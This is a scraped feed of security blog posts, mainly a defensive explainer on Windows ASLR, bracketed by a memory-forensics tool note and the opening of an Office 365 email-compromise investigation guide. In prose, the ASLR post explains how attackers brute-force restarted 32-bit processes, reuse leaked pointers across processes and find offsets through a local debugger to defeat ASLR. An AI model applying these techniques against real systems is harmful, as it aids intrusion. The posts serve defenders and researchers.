names, URLs, Social Security numbers, credit card numbers, arbitrary byte patterns, etc.</p> \n <p>Currently, Audit Viewer is customized for VxClass so if you want to use this feature you must edit <i>ProcessAuditMemory.Batch.xml</i> and run Memoryze from the command-line.</p> \n <p> <code>Memoryze.exe -o -script ProcessAuditMemory.Batch.xml -encoding none</code></p> \n <p>You can also use the batch files included with Memoryze.</p> \n <p> <code>Process.bat -handles true -sections true -ports true -injected true -digsig true -content conficker</code></p> \n <p> <b>Training at CanSecWest</b></p> \n <p>If you would like to sharpen your memory forensics skills, Peter and I will be teaching at <a target=\"_blank\" href=\"http://cansecwest.com/dojos/2011/csw_2_07.html\">CanSecWest</a>.</p> \n</div>","descriptionType":"html","publishedDate":"Thu, 03 Feb 2011 10:25:39 +0000","feedId":1226,"bgimg":"http://zynamics.files.wordpress.com/2011/01/tree-venn.png","linkMd5":"1f2caa91e01abc44789c089c8b346516","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"author":"Jamie Butler","articleImgCdnMap":{"http://zynamics.files.wordpress.com/2011/01/tree-venn.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","https://www.fireeye.com/content/dam/legacy/ammo/generate_report.jpg":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn54@2020_3/2020/08/24/14-11-13-488_c71600e0b98519d8.webp","https://www.fireeye.com/content/dam/legacy/ammo/ir_report.jpg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_3/2020/08/24/14-11-09-956_26dfb7515cf38c9d.webp"},"publishedOrCreatedDate":1598278264215},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Six Facts about Address Space Layout Randomization on Windows","link":"http://www.fireeye.com/blog/threat-research/2020/03/six-facts-about-address-space-layout-randomization-on-windows.html","description":"<p>Overcoming address space layout randomization (ASLR) is a\n  precondition of virtually all modern memory corruption\n  vulnerabilities. Breaking ASLR is an area of active research and can\n  get incredibly complicated. This blog post presents some basic facts\n  about ASLR, focusing on the Windows implementation. In addition to\n  covering what ASLR accomplishes to improve security posture, we aim to\n  give defenders advice on how to improve the security of their\n  software, and to give researchers more insight into how ASLR works and\n  ideas for investigating its limitations.</p>\n <p>Memory corruption vulnerabilities occur when a program mistakenly\n  writes attacker-controlled data outside of an intended memory region\n  or outside intended memory’s scope. This may crash the program, or\n  worse, provide the attacker full control over the system. Memory\n  corruption vulnerabilities have plagued software for decades, despite\n  efforts by large companies like Apple, Google, and Microsoft to\n  eradicate them.</p>\n <p>Since these bugs are hard to find and just one can compromise a\n  system, security professionals have designed failsafe mechanisms to\n  thwart software exploitation and limit the damage should a memory\n  corruption bug be exploited. A “silver bullet” would be a mechanism to\n  make exploits so tricky and unreliable that buggy code can be left in\n  place, giving developers the years they need to fix or rewrite code in\n  memory-safe languages. Unfortunately, nothing is perfect, but address\n  space layout randomization (ASLR) is one of the best mitigations available.</p>\n <p>ASLR works by breaking assumptions that developers could otherwise\n  make about where programs and libraries would lie in memory at\n  runtime. A common example is the locations of gadgets used in\n  return-oriented programming (ROP), which is often used to defeat the\n  defense of data execution prevention (DEP). ASLR mixes up the address\n  space of the vulnerable process—the main program, its dynamic\n  libraries, the stack and heap, memory-mapped files, and so on—so that\n  exploit payloads must be uniquely tailored to however the address\n  space of the victim process is laid out at the time. Writing a worm\n  that propagates by blindly sending a memory corruption exploit with\n  hard-coded memory addresses to every machine it can find is bound to\n  fail. So long as the target process has ASLR enabled, the exploit’s\n  memory offsets will be different than what ASLR has selected. This\n  crashes the vulnerable program rather than exploiting it.</p>\n <h5>Fact 1: ASLR was introduced in Windows Vista. Pre-Vista versions of\n  Windows lacked ASLR; worse, they went to great lengths to maintain a\n  consistent address space across all processes and machines.</h5>\n <p>Windows Vista and Windows Server 2008 were the first releases to\n  feature support for ASLR for compatible executables and libraries. One\n  might assume that prior versions simply didn’t randomize the address\n  space, and instead simply loaded DLLs at whatever location was\n  convenient at the time—perhaps a predictable one, but not necessarily\n  the same between two processes or machines. Unfortunately, these old\n  Windows versions instead went out of their way to achieve what we’ll\n  call “Address Space Layout Consistency”. Table 1 shows the “preferred\n  base address” of some core DLLs of Windows XP Service Pack 3.</p>\n <table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> <tbody>\n    <tr>\n      <td width=\"312\" valign=\"top\"><p>\n          <b>DLL</b></p> </td> <td width=\"312\" valign=\"top\"><p>\n          <b>Preferred Base Address</b></p> </td> </tr>\n    <tr>\n      <td width=\"312\" valign=\"top\"><p>ntdll</p> </td> <td width=\"312\"\n        valign=\"top\"><p>0x7c900000</p> </td> </tr>\n    <tr>\n      <td width=\"312\" valign=\"top\"><p>kernel32</p> </td> <td width=\"312\"\n        valign=\"top\"><p>0x7c800000</p> </td> </tr>\n    <tr>\n      <td width=\"312\" valign=\"top\"><p>user32</p> </td> <td width=\"312\"\n        valign=\"top\"><p>0x7e410000</p> </td> </tr>\n    <tr>\n      <td width=\"312\" valign=\"top\"><p>gdi32</p> </td> <td width=\"312\"\n        valign=\"top\"><p>0x77f10000</p> </td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Table 1: Windows DLLs contain a preferred base\n    address used whenever possible if ASLR is not in place</span></p>\n <p>When creating a process, pre-Vista Windows loads each of the\n  program’s needed DLLs at its preferred base address if possible. If an\n  attacker finds a useful ROP gadget in ntdll at 0x7c90beef, for\n  example, the attacker can assume that it will always be available at\n  that address until a future service pack or security patch requires\n  the DLLs to be reorganized. This means that attacks on pre-Vista\n  Windows can chain together ROP gadgets from common DLLs to disable\n  DEP, the lone memory corruption defense on those releases.</p>\n <p>Why did Windows need to support preferred base addresses? The answer\n  lies in performance and in trade-offs made in the design of Windows\n  DLLs versus other designs like ELF shared libraries. Windows DLLs are\n  not position independent. Especially on 32-bit machines, if Windows\n  DLL code needs to reference a global variable, the runtime address of\n  that variable gets hardcoded into the machine code. If the DLL gets\n  loaded at a different address than was expected, relocation is\n  performed to fix up such hardcoded references. If the DLL instead gets\n  loaded as its preferred base address, no relocation is necessary, and\n  the DLL’s code can be directly mapped into memory from the file system.</p>\n <p>Directly mapping the DLL file into memory is a small performance\n  benefit since it avoids reading any of the DLL’s pages into physical\n  memory until they are needed. A better reason for preferred base\n  addresses is to ensure that only one copy of a DLL needs to be in\n  memory. Without them, if three programs run that share a common DLL,\n  but each loads that DLL at a different address, there would be three\n  DLL copies in memory, each relocated to a different base. That would\n  counteract a main benefit of using shared libraries in the first\n  place. Aside from its security benefits, ASLR accomplishes the same\n  thing—ensuring that the address spaces of loaded DLLs <a\n    href=\"https://devblogs.microsoft.com/oldnewthing/20170120-00/?p=95225\">won’t\n  overlap</a> and loading only a <a\n    href=\"https://devblogs.microsoft.com/oldnewthing/?p=93301\">single\n  copy</a> of a DLL into memory—in a more elegant way. Because ASLR does\n  a better job of avoiding overlap between address spaces than\n  statically-assigned preferred load addresses ever could, manually\n  assigning preferred base addresses provides no optimization on an\n  ASLR-capable OS, and is not needed any longer in the development lifecycle.</p>\n <p>\n  <b>Takeaway 1.1: Windows XP and Windows Server 2003 and earlier do not\n    support ASLR.</b></p>\n <p>Clearly, these versions have been out of support for years and\n  should be long gone from production use. The more important\n  observation relates to software developers who support both legacy and\n  modern Windows versions. They may not realize that the exact same\n  program can be more secure or less secure depending on what OS version\n  is running. Developers who (still!) have a customer base of mixed ASLR\n  and non-ASLR supporting Windows versions should respond to CVE reports\n  accordingly. The exact same bug might appear non-exploitable on\n  Windows 10 but be trivially exploitable on Windows XP. The same\n  applies to Windows 10 versus Windows 8.1 or 7, as ASLR has become more\n  capable with each version.</p>\n <p>\n  <b>Takeaway 1.2: Audit legacy software code bases for misguided ideas\n    about preferred load addresses. </b></p>\n <p>Legacy software may still be maintained with old tools such as\n  Microsoft Visual C++ 6. These development tools contain outdated\n  documentation about the <a\n    href=\"https://www.drdobbs.com/rebasing-win32-dlls/184416272\">role\n    and importance</a> of preferred load addresses. Since these old\n  tools cannot mark images as ASLR-compatible, a “lazy” developer who\n  doesn’t bother to change the default DLL address is actually better\n  off since a conflict will force the image to be rebased to an\n  unpredictable location!</p>\n <h5>Fact 2: Windows loads multiple instances of images at the same\n  location across processes and even across users; only rebooting can\n  guarantee a fresh random base address for all images.</h5>\n <p>ELF images, as used in the Linux implementation of ASLR, can use\n  position-independent executables and position-independent code in\n  shared libraries to supply a freshly randomized address space for the\n  main program and all its libraries on each launch—sharing the same\n  machine code between multiple processes even where it is loaded at\n  different addresses. Windows ASLR does not work this way. Instead,\n  each DLL or EXE image gets assigned a random load address by the\n  kernel the first time it is used, and as additional instances of the\n  DLL or EXE are loaded, they receive the same load address. If all\n  instances of an image are unloaded and that image is subsequently\n  loaded again, the image may or may not receive the same base address;\n  see Fact 4. Only rebooting can guarantee fresh base addresses for all\n  images systemwide.</p>\n <p>Since Windows DLLs do not use position-independent code, the only\n  way their code can be shared between processes is to always be loaded\n  at the same address. To accomplish this, the kernel picks an address\n  (0x78000000 for example on 32-bit system) and begins <a\n    href=\"https://blogs.msdn.microsoft.com/michael_howard/2006/05/26/address-space-layout-randomization-in-windows-vista/\">loading\n    DLLs at randomized addresses</a> just below it. If a process loads a\n  DLL that was used recently, the system may just re-use the previously\n  chosen address and therefore re-use the previous copy of that DLL in\n  memory. The implementation solves the issues of providing each DLL a\n  random address and ensuring DLLs don’t overlap at the same time.</p>\n <p>For EXEs, there is no concern about two EXEs overlapping since they\n  would never be loaded into the same process. There would be nothing\n  wrong with loading the first instance of an EXE at 0x400000 and the\n  second instance at 0x500000, even if the image is larger than 0x100000\n  bytes. Windows just chooses to share code among multiple instances of\n  a given EXE.</p>\n <p>\n  <b>Takeaway 2.1: Any Windows program that automatically restarts after\n    crashing is especially susceptible to brute force attacks to\n    overcome ASLR. </b></p>\n <p>Consider a program that a remote attacker can execute on demand,\n  such as a CGI program, or a connection handler that executes only when\n  needed by a super-server (as in inetd, for example). A Windows service\n  paired with a watchdog that restarts the service when it crashes is\n  another possibility. An attacker can use knowledge of how Windows ASLR\n  works to exhaust the possible base addresses where the EXE could be\n  loaded. If the program crashes and (1) another copy of the program\n  remains in memory, or (2) the program restarts quickly and, as is\n  sometimes possible, receives the same ASLR base address, the attacker\n  can assume that the new instance will still be loaded at the same\n  address, and the attacker will eventually try that same address.</p>\n <p>\n  <b>Takeaway 2.2: If an attacker can discover where a DLL is loaded in\n    any process, the attacker knows where it is loaded in all processes. </b></p>\n <p>Consider a system running two buggy network services—one that leaks\n  pointer values in a debug message but has no buffer overflows, and one\n  that has a buffer overflow but does not leak pointers. If the leaky\n  program reveals the base address of kernel32.dll and the attacker\n  knows some useful ROP gadgets in that DLL, then the same memory\n  offsets can be used to attack the program containing the overflow.\n  Thus, seemingly unrelated vulnerable programs can be chained together\n  to first overcome ASLR and then launch an exploit.</p>\n <p>\n  <b>Takeaway 2.3: A low-privileged account can be used to overcome ASLR\n    as the first step of a privilege escalation exploit. </b></p>\n <p>Suppose a background service exposes a named pipe only accessible to\n  local users and has a buffer overflow. To determine the base address\n  of the main program and DLLs for that process, an attacker can simply\n  launch another copy in a debugger. The offsets determined from the\n  debugger can then be used to develop a payload to exploit the\n  high-privileged process. This occurs because Windows does not attempt\n  to isolate users from each other when it comes to protecting random\n  base addresses of EXEs and DLLs.</p>\n <h5>Fact 3: Recompiling a 32-bit program to a 64-bit one makes ASLR\n  more effective.</h5>\n <p>Even though 64-bit releases of Windows have been mainstream for a\n  decade or more, 32-bit user space applications remain common. Some\n  programs have a true need to maintain compatibility with third-party\n  plugins, as in the case of web browsers. Other times, development\n  teams have a belief that a program needs far less than 4 GB of memory\n  and 32-bit code could therefore be more space efficient. Even Visual\n  Studio <a\n    href=\"https://blogs.msdn.microsoft.com/ricom/2009/06/10/visual-studio-why-is-there-no-64-bit-version-yet/\">remained\n    a 32-bit application</a> for some time after it supported building\n  64-bit applications.</p>\n <p>In fact, switching from 32-bit to 64-bit code produces a small but\n  observable security benefit. The reason is that the ability to\n  randomize 32-bit addresses is limited. To understand why, observe how\n  a 32-bit x86 memory address is broken down in Figure 1. More details\n  are explained at <a\n    href=\"https://en.wikipedia.org/wiki/Physical_Address_Extension\">Physical\n    Address Extension</a>.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/aslr/Picture%201.jpg\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 1: Memory addresses are divided\n    into components, only some of which can be easily randomized at runtime</span></p>\n <p>The operating system cannot simply randomize arbitrary bits of the\n  address. Randomizing the offset within a page portion (bits 0 through\n  11) would break assumptions the program makes about data alignment.\n  The page directory pointer (bits 30 and 31) cannot change because bit\n  31 is reserved for the kernel, and bit 30 is used by Physical Address\n  Extension as a bank switching technique to address more than 2GB of\n  RAM. This leaves 14 bits of the 32-bit address off-limits for randomization.</p>\n <p>In fact, Windows only attempts to randomize 8 bits of a 32-bit\n  address. Those are bits 16 through 23, affecting only the page\n  directory entry and page table entry portion of the address. As a\n  result, in a brute force situation, an attacker can potentially guess\n  the base address of an EXE in 256 guesses.</p>\n <p>When applying ASLR to a 64-bit binary, Windows is able to <a\n    href=\"https://msrc-blog.microsoft.com/2013/12/11/software-defense-mitigating-common-exploitation-techniques/\">randomize\n    17-19 bits of the address</a> (depending on whether it is a DLL or\n  EXE). Figure 2 shows how the number of possible base addresses, and\n  accordingly the number of brute force guesses needed, increases\n  dramatically for 64-bit code. This could allow endpoint protection\n  software or a system administrator to detect an attack before it succeeds.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/aslr/Picture%202.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 2: Recompiling 32-bit code as\n    64-bit dramatically increases the number of possible base addresses\n    for selection by ASLR</span></p>\n <p>\n  <b>Takeaway 3.1: Software that must process untrusted data should\n    always be compiled as 64-bit, even if it does not need to use a lot\n    of memory, to take maximum advantage of ASLR.</b></p>\n <p>In a brute force attack, ASLR makes attacking a 64-bit program at\n  least 512 times harder than attacking the 32-bit version of the exact\n  same program.</p>\n <p>\n  <b>Takeaway 3.2: Even 64-bit ASLR is susceptible to brute force\n    attacks, and defenders must focus on detecting brute force attacks\n    or avoiding situations where they are feasible.</b></p>\n <p>Suppose an attacker can make ten brute force attempts per second\n  against a vulnerable system. In the common case of the target process\n  remaining at the same address because multiple instances are running,\n  the attacker would discover the base address of a 32-bit program in\n  less than one minute, and of a 64-bit program in a few hours. A 64-bit\n  brute force attack would produce much more noise, but the\n  administrator or security software would need to notice and act on it.\n  In addition to using 64-bit software to make ASLR more effective,\n  systems should avoid re-spawning a crashing process (to avoid giving\n  the attacker a “second bite at the apple” to discover the base\n  address) or force a reboot and therefore guaranteed fresh address\n  space after a process crashes more than a handful of times.</p>\n <p>\n  <b>Takeaway 3.3: Researchers developing a proof of concept attack\n    against a program available in both 32-bit and 64-bit versions\n    should focus on the 32-bit one first.</b></p>\n <p>As long as 32-bit software remains relevant, a proof-of-concept\n  attack against the 32-bit variant of a program is likely easier and\n  quicker to develop. The resulting attack could be more feasible and\n  convincing, leading the vendor to patch the program sooner.</p>\n <h5>Fact 4: Windows 10 reuses randomized base addresses more\n  aggressively than Windows 7, and this could make it weaker in some situations.</h5>\n <p>Observe that even if a Windows system must ensure that multiple\n  instances of one DLL or EXE all get loaded at the same base address,\n  the system need not keep track of the base address once the last\n  instance of the DLL or EXE is unloaded. If the DLL or EXE is loaded\n  again, it can get a fresh base address.</p>\n <p>This is the behavior we observed in working with Windows 7. Windows\n  10 can work differently. Even after the last instance of a DLL or EXE\n  unloads, it may maintain the same base address at least for a short\n  period of time—more so for EXEs than DLLs. This can be observed when\n  repeatedly launching a command-line utility under a multi-process\n  debugger. However, if the utility is copied to a new filename and then\n  launched, it receives a fresh base address. Likewise, if a sufficient\n  duration has passed, the utility will load at a different base\n  address. Rebooting, of course, generates fresh base addresses for all\n  DLLs and EXEs.</p>\n <p>\n  <b>Takeaway 4.1: Make no assumptions about Windows ASLR guarantees\n    beyond per-boot randomization.</b></p>\n <p>In particular, do not rely on the behavior of Windows 7 in\n  randomizing a fresh address space whenever the first instance of a\n  given EXE or DLL loads. Do not assume that Windows inherently protects\n  against brute force attacks against ASLR in any way, especially for\n  32-bit processes where brute force attacks can take 256 or fewer guesses.</p>\n <h5>Fact 5: Windows 10 is more aggressive at applying ASLR, and even to\n  EXEs and DLLs not marked as ASLR-compatible, and this could make ASLR stronger.</h5>\n <p>Windows Vista and 7 were the first two releases to support ASLR, and\n  therefore made some trade-offs in favor of compatibility.\n  Specifically, these older implementations would not apply ASLR to an\n  image not marked as ASLR-compatible and would not allow ASLR to push\n    <a\n    href=\"https://devblogs.microsoft.com/oldnewthing/20161014-00/?p=94515\">addresses\n    above the 4 GB boundary</a>. If an image did not opt in to ASLR,\n  these Windows versions would continue to use the preferred base address.</p>\n <p>It is possible to further harden Windows 7 using Microsoft’s\n  Enhanced Mitigation Experience Toolkit (commonly known as EMET) to <a\n    href=\"https://msrc-blog.microsoft.com/2017/11/21/clarifying-the-behavior-of-mandatory-aslr/\">more\n    aggressively apply ASLR</a> even to images not marked as\n  ASLR-compatible. Windows 8 <a\n    href=\"https://msrc-blog.microsoft.com/2013/12/11/software-defense-mitigating-common-exploitation-techniques/\">introduced\n    more features</a> to apply ASLR to non-ASLR-compatible images, to\n  better randomize heap allocations, and to increase the number of bits\n  of entropy for 64-bit images.</p>\n <p>\n  <b>Takeaway 5.1: Ensure software projects are using the correct linker\n    flags to opt in to the most aggressive implementation of ASLR, and\n    that they are not using any linker flags that weaken ASLR.</b></p>\n <p>See Table 2. Linker flags can affect how ASLR is applied to an\n  image. Note that for Visual Studio 2012 and later, the ✔️flags are\n  already enabled by default and the best ASLR implementation will be\n  used so long as no 🚫flags are used. Developers using Visual Studio\n  2010 or earlier, presumably for compatibility reasons, need to check\n  which flags the linker supports and which it enables by default.</p>\n <table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> <tbody>\n    <tr>\n      <td width=\"173\" valign=\"top\"><p>\n          <b>Secure?</b></p> </td> <td width=\"241\" valign=\"top\"><p>\n          <b>Linker Flag</b></p> </td> <td width=\"209\" valign=\"top\"><p>\n          <b>Effect</b></p> </td> </tr>\n    <tr>\n      <td width=\"173\" valign=\"top\"><p style=\"text-align: center;\">✔️</p>\n      </td> <td width=\"241\" valign=\"top\"><p>/DYNAMICBASE</p> </td> <td\n        width=\"209\" valign=\"top\"><p>Marks the image as\n        ASLR-compatible</p> </td> </tr>\n    <tr>\n      <td width=\"173\" valign=\"top\"><p style=\"text-align: center;\">✔️</p>\n      </td> <td width=\"241\" valign=\"top\"><p>/LARGEADDRESSAWARE\n        /HIGHENTROPYVA</p> </td> <td width=\"209\" valign=\"top\"><p>Marks\n          the 64-bit image as free of pointer truncation bugs and\n          therefore allows ASLR to randomize addresses beyond 4 GB</p>\n      </td> </tr>\n    <tr>\n      <td width=\"173\" valign=\"top\"><p style=\"text-align: center;\">🚫</p>\n      </td> <td width=\"241\" valign=\"top\"><p>/DYNAMICBASE:NO</p> </td>\n        <td width=\"209\" valign=\"top\"><p>“Politely requests” that ASLR\n          not be applied by not marking the image as ASLR-compatible.\n          Depending on the Windows version and hardening settings,\n          Windows might apply ASLR anyway.</p> </td> </tr>\n    <tr>\n      <td width=\"173\" valign=\"top\"><p style=\"text-align: center;\">🚫</p>\n      </td> <td width=\"241\" valign=\"top\"><p>/HIGHENTROPYVA:NO</p> </td>\n        <td width=\"209\" valign=\"top\"><p>Opts out 64-bit images from ASLR\n          randomizing addresses beyond 4 GB on Windows 8 and later (to\n          avoid compatibility issues).</p> </td> </tr>\n    <tr>\n      <td width=\"173\" valign=\"top\"><p style=\"text-align: center;\">🚫</p>\n      </td> <td width=\"241\" valign=\"top\"><p>/FIXED</p> </td> <td\n        width=\"209\" valign=\"top\"><p>Removes information from the image\n          that Windows needs in order to apply ASLR, blocking ASLR from\n          ever being applied.</p> </td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Table 2: Linker flags can affect how ASLR is\n    applied to an image</span></p>\n <p>\n  <b>Takeaway 5.2: Enable mandatory ASLR and bottom-up randomization.</b></p>\n <p>Windows 8 and 10 <a\n    href=\"https://msrc-blog.microsoft.com/2017/11/21/clarifying-the-behavior-of-mandatory-aslr/\">contain\n    optional features</a> to forcibly enable ASLR on images not marked\n  as ASLR compatible, and to randomize virtual memory allocations so\n  that rebased images obtain a random base address. This is useful in\n  the case where an EXE is ASLR compatible, but one of the DLLs it uses\n  is not. Defenders should enable these features to apply ASLR more\n  broadly, and importantly, to help discover any remaining\n  non-ASLR-compatible software so it can be upgraded or replaced.</p>\n <h5>Fact 6: ASLR relocates entire executable images as a unit.</h5>\n <p>ASLR relocates executable images by picking a random offset and\n  applying it to all addresses within an image that would otherwise be\n  relative to its base address. That is to say:</p>\n <ul> <li>If two functions in an EXE are at addresses 0x401000 and\n    0x401100, they will remain 0x100 bytes apart even after the image is\n    relocated. Clearly this is important due to the prevalence of\n    relative call and jmp instructions in x86 code. Similarly, the\n    function at 0x401000 will remain 0x1000 bytes from the base address\n    of the image, wherever it may be.</li> <li>Likewise, if two static\n    or global variables are adjacent in the image, they will remain\n    adjacent after ASLR is applied.</li> <li>Conversely, stack and heap\n    variables and memory-mapped files are not part of the image and can\n    be randomized at will without regard to what base address was\n  picked.</li> </ul>\n <p>\n  <b>Takeaway 6.1: A leak of just one pointer within an executable image\n    can expose the randomized addresses of the entire image.</b></p>\n <p>One of the biggest limitations and annoyances of ASLR is that\n  seemingly innocuous features such as a debug log message or stack\n  trace that leak a pointer in the image become security bugs.  If the\n  attacker has a copy of the same program or DLL and can trigger it to\n  produce the same leak, they can calculate the difference between the\n  ASLR and pre-ASLR pointer to determine the ASLR offset. Then, the\n  attacker can apply that offset to every pointer in their attack\n  payload in order to overcome ASLR. Defenders should train software\n  developers about pointer disclosure vulnerabilities so that they\n  realize the gravity of this issue, and also regularly assess software\n  for these vulnerabilities as part of the software development lifecycle.</p>\n <p>\n  <b>Takeaway 6.2: Some types of memory corruption vulnerabilities\n    simply lie outside the bounds of what ASLR can protect.</b></p>\n <p>Not all memory corruption vulnerabilities need to directly achieve\n  remote code execution. Consider a program that contains a buffer\n  variable to receive untrusted data from the network, and a flag\n  variable that lies immediately after it in memory. The flag variable\n  contains bits specifying whether a user is logged in and whether the\n  user is an administrator. If the program writes data beyond the end of\n  the receive buffer, the “flags” variable gets overwritten and an\n  attacker could set both the logged-in and is-admin flags. Because the\n  attacker does not need to know or write any memory addresses, ASLR\n  does not thwart the attack. Only if another hardening technique (such\n  as compiler hardening flags) reordered variables, or better, moved the\n  location of every variable in the program independently, would such\n  attacks be blocked.</p>\n <h4>Conclusion</h4>\n <p>Address space layout randomization is a core defense against memory\n  corruption exploits. This post covers some history of ASLR as\n  implemented on Windows, and also explores some capabilities and\n  limitations of the Windows implementation. In reviewing this post,\n  defenders gain insight on how to build a program to best take\n  advantage of ASLR and other features available in Windows to more\n  aggressively apply it. Attackers can leverage ASLR limitations, such\n  as address space randomization applying only per boot and\n  randomization relocating the entire image as one unit, to overcome\n  ASLR using brute force and pointer leak attacks.</p>\n","descriptionType":"html","publishedDate":"Tue, 17 Mar 2020 17:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/aslr/Picture%201.jpg","linkMd5":"fc0c11961bf194548949f66878d9f6f6","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn19@2020_5/2020/08/24/14-11-06-345_fdb8df13e64022a8.webp","destWidth":701,"destHeight":309,"sourceBytes":28591,"destBytes":19732,"author":"Jacob Thompson","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/aslr/Picture%201.jpg":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn19@2020_5/2020/08/24/14-11-06-345_fdb8df13e64022a8.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/aslr/Picture%202.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn6@2020_1/2020/08/24/14-11-18-873_d7039a5038b6ec19.webp"},"publishedOrCreatedDate":1598278264189},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Obscured by Clouds: Insights into Office 365 Attacks and How Mandiant\nManaged Defense Investigates","link":"http://www.fireeye.com/blog/threat-research/2020/07/insights-into-office-365-attacks-and-how-managed-defense-investigates.html","description":"<p>With Business Email Compromises (BECs) <a href=\"https://pdf.ic3.gov/2019_IC3Report.pdf\">showing no signs of slowing down</a>, it is becoming increasingly important for security analysts to understand Office 365 (O365) breaches and how to properly investigate them. This blog post is for those who have yet to dip their toes into the waters of an O365 BEC, providing a crash course on Microsoft’s cloud productivity suite and its assortment of logs and data sources useful to investigators. We’ll also go over common attacker tactics we’ve observed while responding to BECs and provide insight into how Mandiant Managed Defense analysts approach these investigations at our customers using PowerShell and the <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/helix.html\">FireEye&nbsp;Helix platform</a>.</p> \n<h4>Office 365</h4> \n<p>Office 365 is Microsoft’s cloud-based subscription service for the Microsoft Office suite. It is built from dozens of applications tightly embedded into the lives of today’s workforce, including:</p> \n<ul> \n <li>Exchange Online, for emails</li> \n <li>SharePoint, for intranet portals and document sharing</li> \n <li>Teams and Skype for Business, for instant messaging</li> \n <li>OneDrive, for file sharing</li> \n <li>Microsoft Stream, for recorded meetings and presentations</li> \n</ul> \n<p>As more and more organizations decide to adopt Microsoft’s cloud-based offering to meet their needs, unauthorized access to these O365 environments, or <i>tenants</i> in Microsoft’s parlance, has become increasingly lucrative to motivated attackers. The current high adoption rate of O365 means that attackers are getting plenty of hands on experience with using and abusing the platform. While many tactics have remained largely unchanged in the years since we’ve first observed them, we’ve also witnessed the evolution of techniques that are effective against even security-conscious users.</p> \n<p>In general, the O365 compromises we’ve responded to have fallen into two categories:</p> \n<ul> \n <li>Business Email Compromises (BECs)</li> \n <li>APT or state-sponsored intrusions</li> \n</ul> \n<p>Based on our experience, BECs are a common threat to any organization's O365 tenant. The term “BEC” typically refers to a type of fraud committed by financially motivated attackers. BEC actors heavily rely on social engineering to carry out their schemes, ultimately defrauding organizations and even personnel.</p> \n<p>One common BEC scheme involves compromising a C-suite executive’s account via phishing. Once the victim unwittingly enters their credentials into a web form masquerading as the legitimate Office 365 login portal, attackers log in and instruct others in the organization to conduct a wire transfer, perhaps under the guise of an upcoming acquisition that has yet to be publicly announced. However, we’ve also observed more effective schemes where attackers compromise those in financial positions and patiently wait until an email correspondence has begun about a due payment. Attackers seize this opportunity by sending a doctored invoice (sometimes based on a legitimate invoice that had been stolen earlier) on behalf of the compromised user to another victim responsible for making payments. These emails are typically hidden from the compromised user due to attacker-created Outlook mailbox rules. Often times, by the time the scheme is inevitably discovered and understood days or weeks later, the money is unrecoverable—highlighting the importance of contacting law enforcement immediately if you’ve fallen victim to a fraud.</p> \n<p>The personal finances of staff aren’t off limits to attackers either. We’ve observed several cases of W-2 scams, in which attackers send a request to HR for W-2 information from the victim’s account. Once obtained, this personally identifiable information is later used to conduct tax fraud.</p> \n<p>Conversely, APT intrusions are typically more sophisticated and are conducted by state-sponsored threat actors. Rather than for financial gain, APT actors are usually tasked to compromise O365 tenants for purposes of espionage, data theft, or destruction. Given the wealth of sensitive information housed in any given organization’s O365 tenant, APT actors may not even need to touch a single endpoint to complete their mission, sidestepping the many security controls organizations have implemented and invested in.</p> \n<h4>O365 Logs and Data Sources</h4> \n<p>In this section, we’ll touch on the multitude of logs and portals containing forensic data relevant to an O365 investigation.</p> \n<p>Before we can begin investigating an O365 case, we’ll work with our clients to get an “Investigator” account provisioned with the roles required to obtain the forensic data we need. For the purposes of this blog post, we’ll quickly list the roles needed for an Investigator account, but during an active Managed Defense investigation, a designated Managed Defense consultant will provide further guidance on account provisioning.</p> \n<p>At a minimum, the Investigator account should have the following roles:</p> \n<p> <i>Exchange Admin Roles</i></p> \n<ul> \n <li>View-only audit logs</li> \n <li>View-only configuration</li> \n <li>View-only recipients</li> \n <li>Mailbox Search</li> \n <li>Message Tracking</li> \n</ul> \n<p> <i>eDiscovery Rights</i></p> \n<ul> \n <li>eDiscovery Manager role</li> \n</ul> \n<p> <i>Azure Active Directory Roles</i></p> \n<ul> \n <li>Global Reader</li> \n</ul> \n<p> <b>Unified Audit Log (UAL)</b></p> \n<p>The Unified Audit Log records activity from various applications within the Office 365 suite, and can be considered O365’s main log source. Entries in the UAL are stored in JSON format. We recommend using the PowerShell cmdlet <b>Search-UnifiedAuditLog</b> to query the UAL as it allows for greater flexibility, though it can also be acquired from the Office 365 Security &amp; Compliance Center located at <a href=\"https://protection.office.com/\">protection.office.com</a>. In order to leverage this log source (and the Admin Audit Log), ensure that the <i>Audit Log Search</i> feature is enabled.</p> \n<p>The UAL has a few nuances that are important to consider. While it provides a good high-level summary of activity across various O365 applications, it won’t log comprehensive mailbox activity (for that, acquire the Mailbox Audit Log). Furthermore, the UAL has a few limitations, namely:</p> \n<ul> \n <li>Results to a single query are limited to 5000 results</li> \n <li>Only 90 days of activity are retained</li> \n <li>Events may take up to 24 hours before they are searchable</li> \n</ul> \n<p> <b>Mailbox Audit Log (MAL)</b></p> \n<p>The Mailbox Audit Log, part of Exchange Online, will capture additional actions performed against objects within a mailbox. As such, it’s a good idea acquire and analyze the MAL for each affected user account with the PowerShell cmdlet <b>Search-MailboxAuditLog</b>. Note that entries in the MAL will be retained for 90 days (by default) and timestamps will be based on the user’s local time zone. The MAL’s retention time can always be increased with the PowerShell cmdlet <b>Set-Mailbox</b> along with the <b>AuditLogAgeLimit</b> 